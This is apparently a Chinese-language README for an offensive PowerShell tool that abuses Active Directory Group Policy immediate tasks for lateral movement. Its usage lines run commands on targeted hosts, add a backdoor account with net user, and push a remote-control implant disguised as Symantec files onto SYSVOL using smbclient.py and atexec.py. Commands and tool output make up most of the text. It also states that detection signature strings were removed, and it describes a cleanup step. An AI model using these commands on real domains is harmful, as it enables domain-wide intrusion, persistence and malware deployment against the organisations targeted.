references：

- [https://social.technet.microsoft.com/Forums/en-US/cb2ac95f-cbaf-40f1-8f6e-6de10ac5fa02/how-to-create-a-gpo-that-implements-a-logon-script?forum=winserverpowershell](https://social.technet.microsoft.com/Forums/en-US/cb2ac95f-cbaf-40f1-8f6e-6de10ac5fa02/how-to-create-a-gpo-that-implements-a-logon-script?forum=winserverpowershell)
- [https://social.technet.microsoft.com/wiki/contents/articles/51876.group-policy-filtering-and-permission.aspx](https://social.technet.microsoft.com/wiki/contents/articles/51876.group-policy-filtering-and-permission.aspx)
- [https://social.technet.microsoft.com/Forums/en-US/a9d12558-3dbe-4f29-9268-c682fcc48596/setgppermissions-always-prompting?forum=winserverpowershell](https://social.technet.microsoft.com/Forums/en-US/a9d12558-3dbe-4f29-9268-c682fcc48596/setgppermissions-always-prompting?forum=winserverpowershell)

脚本自删除功能仅适用于ps 3.0+（windows 2008 R2版本为2.0，无法使用此功能）

**需要AD Admin权限，本工具通过GPO机制来针对指定机器或者用户或者某个OU内的所有的机器进行命令执行等操作，对于主机能连接DC，而DC无法主动连接到主机的域环境非常适用**

# 通过GPP即时任务执行命令

**需要在PDC上执行（持有FSMO角色的DC）**

可使用这条命令进行查询

```
netdom query fsmo
```

结果中的PDC就是



==在普通DC上使用atexec执行名创建GPO的命令，会在PDC上生成一个日志，从下图中可以看到，该DC使用自己的机器账户到PDC上进行认证，因此无法创建GPO（DC的机器账户没有创建GPO的权限）==

![1632282405521](https://github.com/wqreytuk/AD_GPO_EXEC/blob/main/005-GPP%20immediate%20task.assets/1632282405521.png)

![1632282268464](https://github.com/wqreytuk/AD_GPO_EXEC/blob/main/005-GPP%20immediate%20task.assets/1632282268464.png)



脚本：

```powershell
C:\Users\x\Desktop\work\内部文库\no-sec\no-sec\library\09-横向移动\https://github.com/wqreytuk/AD_GPO_EXEC/blob/main/005-GPP%20immediate%20task.assets\cs.ps1
```



俄语版本

```
C:\Users\x\Desktop\work\内部文库\no-sec\no-sec\no-sec\library\09-横向移动\https://github.com/wqreytuk/AD_GPO_EXEC/blob/main/005-GPP%20immediate%20task.assets\1.ps1
```

注意：在俄语环境中使用该脚本的时候，不要使用任何编辑器打开该文件并保存，会导致实际运行时乱码

特征字符已经全部删除



## 创建

接受以下参数

- BackupPath
  - GPO备份路径
- GPODisplayName
  - GPO名称
- OUPath
  - 要链接到的OU路径
- BatchUser
  - 批量执行，目标OU中的所有用户都会执行该即时任务
- User ==[和UserList 二选一]==
  - 指定应用该GPO的用户
- UserList ==[和User 二选一]==
  - 指定应用该GPO的用户列表文件路径，==**以$分割**==
- CmdArg ==[和ScriptPath二选一]==
  - 命令参数
- ScriptPath ==[和CmdArg 二选一]==
  - 脚本绝对路径
- ScriptArg
  - 脚本参数
- IG
  - 搜集信息
- Deploy
  - 部署远控
- DeployFileList
  - 远控文件列表路径，==**以$分割**==
- DeployArg
  - 执行远控的参数（通常是exe文件名）
- DCFqdn
  - PDC的FQDN
- CPFqdn
  - 实际用于复制文件的DC
- Machine
  - 指定账户类型为计算机账户

### 用法1：在目标主机上执行命令

```
powershell -executionpolicy bypass -command "& { import-module C:\Path\To\cs.ps1; New-Fusck -DCFqdn WIN-ER6H1V81DV9.mother.fucker -BackupPath C:\users\public\downloads -GPODisplayName fuck_your_mother -OUPath 'DC=mother,DC=fucker' -User mother.fucker\test -CmdArg '/c net user test qwe123... /add' }"
```

### 用法2：执行bat脚本

示例bat脚本：

```bash
echo 123ssssssssssssssssss > C:\finalllllllllllllllllllllllllll.txt
```



```
powershell -executionpolicy bypass -command "& { import-module C:\Path\To\cs.ps1; New-Fusck -DCFqdn WIN-ER6H1V81DV9.mother.fucker -CPFqdn WIN-ER6H1V81DV9.mother.fucker -BackupPath C:\users\public\downloads -GPODisplayName fuck_your_mother -ScriptPath C:\Path\To\test.bat -OUPath 'DC=mother,DC=fucker' -User mother.fucker\test }"
```

### 用法3：执行vbs脚本

示例vbs脚本：

```vbscript
Set objFSO=CreateObject("Scripting.FileSystemObject")
outFile="c:\222222222222222222222222222222.inf"
Set objFile = objFSO.CreateTextFile(outFile,True)
objFile.Write "test222222222222222 string" & vbCrLf
objFile.Close
```



```
powershell -executionpolicy bypass -command "& { import-module C:\Path\To\cs.ps1; New-Fusck -DCFqdn WIN-ER6H1V81DV9.mother.fucker -CPFqdn WIN-ER6H1V81DV9.mother.fucker -BackupPath C:\users\public\downloads -GPODisplayName fuck_your_mother -ScriptPath C:\Path\To\test.vbs -OUPath 'DC=mother,DC=fucker' -User mother.fucker\test }"
```

### 用法4：执行ps1脚本

示例ps1脚本

```
function test {
Get-Process | Out-File -FilePath C:\poweppppppppppppp.txt -NoClobber | out-null
}
```



```
powershell -executionpolicy bypass -command "& { import-module C:\Path\To\cs.ps1; New-Fusck -DCFqdn WIN-ER6H1V81DV9.mother.fucker -CPFqdn WIN-ER6H1V81DV9.mother.fucker -BackupPath C:\users\public\downloads -GPODisplayName fuck_your_mother -ScriptPath C:\Path\To\test.ps1 -OUPath 'DC=mother,DC=fucker' -User mother.fucker\test -ScriptArg test }"
```



### 用法5：搜集信息

```
powershell -executionpolicy bypass -command "& { import-module C:\Path\To\cs.ps1; New-Fusck -DCFqdn WIN-ER6H1V81DV9.mother.fucker -CPFqdn WIN-ER6H1V81DV9.mother.fucker -BackupPath C:\users\public\downloads -GPODisplayName fuck_your_mother -OUPath 'DC=mother,DC=fucker' -User mother.fucker\test -IG }"
```

==存储目标主机信息的文件名进行了随机化，目录不变，但out.txt并不存在，取而代之的是一个以随机字符串命名的文本文件==

### 用法6：部署远控

```
powershell -executionpolicy bypass -command "& { import-module C:\Users\admi
nistrator\Desktop\1.ps1; New-Fusck -DCFqdn WIN-ER6H1V81DV9.mother.fucker -CPFqdn WIN-ER6H1V81DV9.mother.fucker -Backup
Path C:\users\public\downloads -GPODisplayName fuck_your_mother -OUPath 'DC=mother,DC=fuck
er' -User mother.fucker\test -Deploy -DeployFileList C:\Windows\Tasks\policy\1.t
xt -DeployArg sdf.exe }"
```



![1631853561186](https://github.com/wqreytuk/AD_GPO_EXEC/blob/main/005-GPP%20immediate%20task.assets/1631853561186.png)





## 清理

接受以下参数:

- GPODisplayName
  - 要删除的GPO名称

​	

用法示例：

```
powershell -executionpolicy bypass -command "& { import-module C:\Path\To\cs.ps1; clean-butt -GPODisplayName fuck_your_mother }"
```



# 坑

## 1

备份出来的所有文件中只有backup.xml需要改动

 

## 2 

经过测试，GPO备份生成的backup.xml文件中的`UserVersionNumber`节点和`MachineVersionNumber`节点的值和原始GPO的gpt.ini文件中的版本值有关

假设gpt.ini版本值为131080，也就是16进制的20008，亦即用户版本为2，机器版本为8（高位为用户，低位为机器）

则backup.xml中上述两个节点的值分别为：`131073`和`524289`，也就是16进制的`20001`和`80001`

这个规则就和之前的不同了，低位统一为`0001`，只有高位才是真正的有效值

还原之后，会在原有GPT.ini的版本基础上，用户和机器版本各+1，最后GPT.ini的值会变成`196617`，就是`30009`



但是如果你把backup.xml中的这两个版本号修改为0，那么即使还原之后的GPT.ini版本值不为0，该GPO依然不会被应用，日志中根本看不到，正常如果被应用的话，日志中会有一条检测到GPO更改的记录

当backup.xml中两个版本都为0的时候会导致创建出来的GPO设置为空，即使对应的文件夹中有相关设置

![1631866662916](https://github.com/wqreytuk/AD_GPO_EXEC/blob/main/005-GPP%20immediate%20task.assets/1631866662916.png)

![1631866787732](https://github.com/wqreytuk/AD_GPO_EXEC/blob/main/005-GPP%20immediate%20task.assets/1631866787732.png)

最终导致客户端无法正常应用GPO设置完成既定的任务



而且，windows的组策略的更新机制，貌似并不仅取决于gpt.ini中的数值，因为在我的测试过程中，使用cs.ps1生成修改后的GPO之后，即使把GPT.ini的值改为0，仍然可以正常更新GPO并应用设置



感兴趣的话可以进行深入研究，但是这个目前来讲并没有太大的意义，只要我们的目的达到就行



## 3、俄语环境



domain computers组和authenticated users组应该调整为对应的俄语

## 4、`Group Policy Creator Owners`组

用户必须为`Group Policy Creator Owners`组成员才能够创建GPO

`Domain Computers`对应`Компьютеры домена`

`Authenticated Users`对应`Прошедшие проверку`

## 5、KB3163622

打了这个补丁的服务器，在替换掉Authenticated Users组权限的时候需要确认

```powershell
Set-GPPermissions -Name $GPODisplayName -PermissionLevel None -TargetName "Прошедшие проверку" -TargetType Group -Replace| out-null
```





![1632198129856](https://github.com/wqreytuk/AD_GPO_EXEC/blob/main/005-GPP%20immediate%20task.assets/1632198129856.png)

且Set-Gppermissions存在bug无法使用confirm选项跳过确认框，且未实现-force选项

解决办法只有将Authenticated Users组的权限更改为GpoRead来变相实现取消其GpoApply权限的目的

## 6、DC之间的同步

可能会发生目标用户在更新组策略时，其拉取组策略的DC尚未从PDC同步新增的GPO，从而导致此次更新失败的情况

无解决方案，只能等



# x3 更新

## x3.1 2022-01-17更新

由于在使用deploy选项部署远控时，出现无法解决的错误，因此将脚本的`319`和`415`行的`copy-item`注释掉了

当需要使用deploy部署包含多个文件的远控时，你仍然需要给定文件列表，但是脚本不会帮你自动拷贝到GPO目录

你需要根据脚本输出的GPO路径，自行拷贝，注意文件名和文件列表中的保持一致



例子：

创建一个`1.txt`，内容如下：

```
SNAC.EXE$SymantecNetworkAccess.log$WGXMAN.DLL
```

你只需要提供正确的文件名列表即可，把`1.txt`传到DC的任意路径，然后创建GPO

```
atexec.py mother.fucker/Administrator:qwe123...@192.168.25.154 "powershell -executionpolicy bypass -command \"& { import-module C:\Users\Administrator\Downloads\cs.ps1; New-Fusck -DCFqdn WIN-JQ0277IA4MA.mother.fucker -CPFqdn WIN-JQ0277IA4MA.mother.fucker -BackupPath C:\users\public\downloads -GPODisplayName fuck_your_mother -OUPath 'DC=mother,DC=fucker' -User mother.fucker\2012-1 -Deploy -DeployFileList C:\Windows\Tasks\1.txt -DeployArg SNAC.exe }\""
```

脚本输出如下：

```bash
[*] start import module
[+] module import complete
[*] retrive backup GUID and GPO GUID
[+] calculated base DN:  dc=mother,dc=fucker
[+] backup_guid:                 99D9C1C9-CAFA-4877-9162-06829DD17E6C
[+] gpo_guid:                    2E43D0FD-9822-4B18-B99B-C9121934CBBD
[+] gpo_display_name:            fuck_your_mother
[+] retrive completed
[*] start changing GPO backup files
[*] Sweet dest path:
         \\WIN-JQ0277IA4MA.mother.fucker\sysvol\mother.fucker\Policies\{2E43D0FD-9822-4B18-B99B-C9121934CBBD}
[+] GPO content modify complete
[*] restore GPO with modified folder
[+] BackupPath:                  C:\users\public\downloads\{99D9C1C9-CAFA-4877-9162-06829DD17E6C}
[+] GPO backup folder removed
[+] finished! enjoy!
```

根据输出我们可以确定远控文件要拷贝到的目标路径

```
\\WIN-JQ0277IA4MA.mother.fucker\sysvol\mother.fucker\Policies\{2E43D0FD-9822-4B18-B99B-C9121934CBBD}
```

使用`smbclient.py`进行文件的上传

```bash
└─$ smbclient.py mother.fucker/Administrator:qwe123...@192.168.25.154                      
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# use sysvol
# cd mother.fucker/Policies/{2E43D0FD-9822-4B18-B99B-C9121934CBBD}
# lcd /tmp/.X11-unix
/tmp/.X11-unix
# put SNAC.EXE
# put SymantecNetworkAccess.log
# put WGXMAN.DLL
```



等待目标主机更新组策略，即可上线：

![1642409005686](https://github.com/wqreytuk/AD_GPO_EXEC/blob/main/005-GPP%20immediate%20task.assets/1642409005686.png)
